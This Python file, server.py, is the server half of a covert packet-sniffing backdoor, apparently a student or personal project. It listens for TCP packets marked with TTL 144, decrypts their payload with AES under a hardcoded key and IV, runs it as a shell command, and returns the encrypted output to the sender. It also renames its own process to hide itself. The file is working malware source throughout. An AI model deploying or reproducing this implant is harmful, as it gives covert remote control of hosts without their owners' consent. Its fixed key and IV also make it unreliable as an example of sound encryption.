#!/usr/bin/env python

###########################################################################################
# FILE
#
#   Name:  server.py
#
#   Developer:  Eunsaem Lee
#
#   Date:       2022-11-01
#
#   Description:
#     A packet-sniffing backdoor application that receives commands from the client, 
#     executes it, and returns the output to the client. It uses AES cipher with an 
#     encryption key and salt value for encryption and decryption.
#
###########################################################################################

from Crypto.Cipher import AES
from setproctitle import setproctitle
from scapy.all import *
import argparse
import os
import subprocess
import time

# process name
DEFAULT_NAME = "abc"
# key value has to be 16 bytes for AES encryption
DEFAULT_KEY = "absentmindedness"
# salt value has to be 16 bytes for AES encryption
DEFAULT_SALT = "overenthusiastic"

# Scapy stacking layer
ether = Ether()

###########################################################################################
# FUNCTION (MAIN)
#
#   Name:  main
#
#   Parameters:
#     None.
#
#   Returns:
#     None.
#
#   Description:
#     Command line prompt with a help function that displays the application's switches and
#     command line arguments. Determines whether the application is running on root and 
#     sniffs TCP packets with TTL = 144 (identifier). If not, prints an error message.
#
###########################################################################################
def main():
    # Command line prompt
    # (help function that displays the application's switches and command line arguments)
    parser = argparse.ArgumentParser(description="Packet-Sniffing Backdoor application [Server]")
    parser.add_argument("-n", "--pname", help="Process name for deception; default name: abc")

    args = parser.parse_args()

    # Set process name
    if args.pname:
        setproctitle(args.pname)
    else:
        setproctitle(DEFAULT_NAME)
    
    # Check if the application is running on root
    if (os.getuid() != 0):
        print("This application must be run with root/sudo")
        sys.exit(1)

    print("Sniffing for traffic...")
    # Use Scapy to sniff TCP packets with TTL of 144 (identifier) and
    # calls the recv_cmd function
    while True:
        sniff(filter="tcp", prn=recv_cmd, stop_filter=check_pkt)

###########################################################################################
# FUNCTION
#
#   Name:  encrypt
#
#   Parameters:
#     data      - command output
#
#   Returns:
#     enc_data  - encrypted data
#
#   Description:
#     Encrypts the data string using AES Cipher with an encryption key and salt value.
#
###########################################################################################
def encrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")

    # Create an encryption object using the encryption key and salt value in CFB mode
    encObj = AES.new(key, AES.MODE_CFB, salt)
    
    enc_data = encObj.encrypt(data)
    return enc_data

###########################################################################################
# FUNCTION
#
#   Name:  decrypt
#
#   Parameters:
#     data      - command input
#
#   Returns:
#     dec_data  - decrypted data
#
#   Description:
#     Decrypts the data using AES Cipher with an encryption key and salt value.
#
###########################################################################################
def decrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")

    # Create a decryption object using the encryption key and salt value in CFB mode
    decObj = AES.new(key, AES.MODE_CFB, salt)

    dec_data = decObj.decrypt(data)
    return dec_data

###########################################################################################
# FUNCTION
#
#   Name:  recv_cmd
#
#   Parameters:
#     packet    - packet object sniffed with scapy
#
#   Returns:
#     None.
#
#   Description:
#     Parses packet object from sniffing the network traffic, decrypts the extracted 
#     command using AES cipher with encryption and salt value, and runs the command. If 
#     there is a command output, encrypts it using AES cipher, embeds it into a packet, and
#     sends it to the client.
#
###########################################################################################
def recv_cmd(packet):
    if IP in packet[0]:
        ttl = packet[IP].ttl
        # Check that TCP packets with TTL of 144 (identifier) are coming from the expected address
        if ttl == 144:
            srcIP = packet[IP].src
            dstport = packet[TCP].dport

            # Decrypt the extracted command from the Raw layer
            cmd = decrypt(packet[Raw].load)

            # Pipe the command to a shell subprocess to receive the output
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = process.communicate()
            data = stdout + stderr

            # If no output generated from the command
            if data.strip() == "":
                data = "No output was generated from the command: {0}".format(cmd)

            # Encrypt the shell output
            enc_data = encrypt(data)

            # Create a packet with encrypted output and send to client
            output_packet = ether / IP(dst=srcIP, ttl=144) / TCP(dport=dstport) / Raw(load=enc_data)
            time.sleep(0.1)
            sendp(output_packet, verbose=0)

###########################################################################################
# FUNCTION
#
#   Name:  check_pkt
#
#   Parameters:
#     packet    - packet object sniffed with scapy
#
#   Returns:
#     True      - packet is authentic
#     False     - packet is NOT authentic
#
#   Description:
#     Checks if the sniffed packets are meant for the backdoor itself by the identifier. 
#     Returns True or False.
#
###########################################################################################
def check_pkt(packet):
    if (IP in packet[0] and Raw in packet[2]):
        ttl = packet[IP].ttl

        if ttl == 144:
            return True
    else:
        return False

###########################################################################################
# FUNCTION (DRIVER)
#
#   Name:  main
#
#   Parameters:
#     None.
#
#   Returns:
#     None.
#
#   Description:
#     Calls the main function.
#
###########################################################################################
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit("\nExiting...")
